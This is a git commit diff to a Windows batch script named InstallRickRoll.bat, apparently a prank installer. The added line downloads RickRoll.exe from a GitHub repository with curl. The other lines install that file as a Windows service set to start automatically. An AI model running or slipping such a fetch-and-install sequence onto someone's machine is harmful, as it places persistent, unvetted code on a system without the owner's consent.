ceae125eb18932a733ba1996aba7395594162a96
Cancarutu2012 <materadetzky2012@gmail.com>
2026-04-15 18:56:50 +0200

    Update InstallRickRoll.bat

--- InstallRickRoll.bat
+++ InstallRickRoll.bat
@@ -1,4 +1,5 @@
-cd C:\Windows\Microsoft.NET\Framework\v4.0.30319 
+cd C:\Windows\Microsoft.NET\Framework\v4.0.30319
+curl -L -o %~dp0RickRoll.exe https://github.com/Cancarutu2012/rroll/raw/refs/heads/main/RickRoll.exe
 InstallUtil.exe %~dp0RickRoll.exe
 sc config RicksService start=auto
 net start AstleyLovesYou
